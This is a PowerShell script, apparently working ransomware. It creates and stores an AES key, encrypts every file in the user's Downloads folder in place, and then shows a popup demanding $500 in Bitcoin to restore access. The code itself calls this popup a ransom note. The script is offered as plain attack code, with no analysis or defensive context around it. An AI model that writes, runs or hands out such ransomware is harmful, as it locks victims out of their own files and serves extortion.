# Path to the encryption key file
$keyPath = "$PSScriptRoot\encryption_key.key"

# Function to generate and save a secure encryption key
function GenerateAndSave-Key {
    $key = [System.Security.Cryptography.Aes]::Create().Key
    [System.IO.File]::WriteAllBytes($keyPath, $key)
    return $key
}

# Function to load an existing encryption key
function Load-Key {
    return [System.IO.File]::ReadAllBytes($keyPath)
}

# Encrypt a file with a given key
function Encrypt-File($filePath, $key) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = New-Object byte[] ($aes.BlockSize / 8)
    $aes.GenerateIV()

    $encryptor = $aes.CreateEncryptor()
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)

    $output = New-Object byte[] ($aes.IV.Length + $encryptedBytes.Length)
    $aes.IV.CopyTo($output, 0)
    $encryptedBytes.CopyTo($output, $aes.IV.Length)

    [System.IO.File]::WriteAllBytes($filePath, $output)
    Write-Output "Encrypted $filePath"
}

# Function to encrypt all files in the Downloads folder
function Encrypt-DownloadsFolder($key) {
    $downloadsFolder = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("UserProfile"), "Downloads")

    if (Test-Path $downloadsFolder) {
        Get-ChildItem -Path $downloadsFolder -File | ForEach-Object {
            Encrypt-File -filePath $_.FullName -key $key
        }
    } else {
        Write-Output "Downloads folder does not exist: $downloadsFolder"
    }
}

# Function to display a note popup
function Show-NotePopup {
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show("Your files have been encrypted. To restore access, please pay $500 in BTC to  with the payment details.", "Important Notice", "OK", "Warning")
}

# Main script logic
if (-not (Test-Path $keyPath)) {
    $key = GenerateAndSave-Key
} else {
    $key = Load-Key
}

# Encrypt files in the Downloads folder
Encrypt-DownloadsFolder -key $key

# Show the ransom note popup
Show-NotePopup
